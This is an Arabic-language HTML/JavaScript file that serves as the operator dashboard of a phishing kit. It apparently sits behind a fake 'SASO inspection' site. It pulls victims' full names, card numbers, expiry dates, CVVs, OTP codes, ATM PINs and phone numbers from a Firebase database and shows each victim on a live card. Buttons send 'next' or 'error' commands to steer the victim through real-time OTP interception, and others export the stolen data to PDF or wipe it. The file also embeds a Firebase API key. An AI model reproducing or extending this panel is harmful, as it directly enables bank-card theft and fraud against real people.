<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم الاحترافية - المهندس حسن</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
        .header { background: #1a6d44; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .stats { background: #ffd700; color: #000; padding: 5px 15px; border-radius: 20px; font-weight: bold; }
        .card { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; border-right: 8px solid #1a6d44; position: relative; box-shadow: 0 2px 8px rgba(0,0,0,0.05); animation: slideIn 0.3s ease; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        .status-tag { position: absolute; left: 15px; top: 12px; background: #e8f5e9; color: #1a6d44; padding: 4px 10px; border-radius: 5px; font-size: 11px; font-weight: bold; }
        .data-grid { display: flex; flex-wrap: wrap; gap: 20px; margin-top: 30px; border-top: 1px dashed #ddd; padding-top: 15px; }
        .data-item { display: flex; flex-direction: column; min-width: 100px; }
        .label { font-size: 10px; color: #888; margin-bottom: 2px; }
        .value { font-size: 14px; font-weight: bold; color: #333; font-family: 'Courier New', monospace; }
        .otp-style { background: #fff5f5; padding: 5px; border-radius: 5px; color: #d32f2f; border: 1px solid #ffcdd2; }
        .actions { margin-top: 15px; text-align: left; }
        .btn { padding: 8px 18px; border-radius: 5px; border: none; cursor: pointer; font-weight: bold; margin-left: 5px; transition: 0.2s; }
        .btn-ok { background: #2ecc71; color: white; }
        .btn-err { background: #e74c3c; color: white; }
        .btn-clear { background: #333; color: white; padding: 10px; width: 100%; margin-bottom: 10px; }
    </style>
</head>
<body onload="_init()">

<audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div class="header">
    <div class="stats">النشطون الآن: <span id="live_total">0</span></div>
    <div style="display:flex; gap:10px;">
        <button class="btn" style="background:#c0392b;" onclick="_clearAll()">تصفير شامل للبيانات</button>
        <button class="btn" style="background:#2c3e50;" onclick="_savePDF()">حفظ PDF</button>
    </div>
</div>

<div id="main_container"></div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/"
    };

    function _init() {
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // قراءة البيانات من مجلد orders (الأساسي للبطاقات)
        database.ref('orders').on('value', snapshot => {
            const container = document.getElementById('main_container');
            container.innerHTML = '';
            let count = 0;

            snapshot.forEach(child => {
                const data = child.val();
                const id = child.key;
                count++;

                // محاولة جلب حالة الصفحة من live_sessions
                database.ref('live_sessions/' + id).once('value').then(liveSnap => {
                    const live = liveSnap.val() || {};
                    const cardMarkup = `
                        <div class="card">
                            <div class="status-tag">الحالة: ${live.status || data.status || 'في الموقع'} | الصفحة: ${live.page || 'index'}</div>
                            <div class="data-grid">
                                <div class="data-item"><span class="label">الأسم</span><span class="value">${data.fullName || '---'}</span></div>
                                <div class="data-item"><span class="label">رقم البطاقة</span><span class="value">${data.cardNumber || 'بانتظار..'}</span></div>
                                <div class="data-item"><span class="label">التاريخ/CVV</span><span class="value">${data.expiryDate || '--'} / ${data.cvv || '--'}</span></div>
                                <div class="data-item otp-style"><span class="label">كود OTP</span><span class="value">${data.otp || '---'}</span></div>
                                <div class="data-item"><span class="label">ATM PIN</span><span class="value">${data.atm_pin || '---'}</span></div>
                                <div class="data-item"><span class="label">الجوال</span><span class="value">${data.phone || '---'}</span></div>
                            </div>
                            <div class="actions">
                                <button class="btn btn-ok" onclick="_control('${id}', 'next')">متابعة العميل</button>
                                <button class="btn btn-err" onclick="_control('${id}', 'error')">إرسال خطأ</button>
                            </div>
                        </div>
                    `;
                    container.insertAdjacentHTML('afterbegin', cardMarkup);
                });
            });
            document.getElementById('live_total').innerText = count;
            if(count > 0) document.getElementById('notif').play().catch(()=>{});
        });
    }

    function _control(id, action) {
        firebase.database().ref('orders/' + id).update({ control_action: action });
        alert('تم إرسال الأمر للعميل: ' + action);
    }

    function _clearAll() {
        if(confirm("تحذير: سيتم مسح كافة البيانات الحالية والقديمة نهائياً؟")) {
            firebase.database().ref('orders').remove();
            firebase.database().ref('live_sessions').remove();
            location.reload();
        }
    }

    function _savePDF() {
        const element = document.getElementById('main_container');
        html2pdf().from(element).save('Data_Report.pdf');
    }
</script>
</body>
</html>
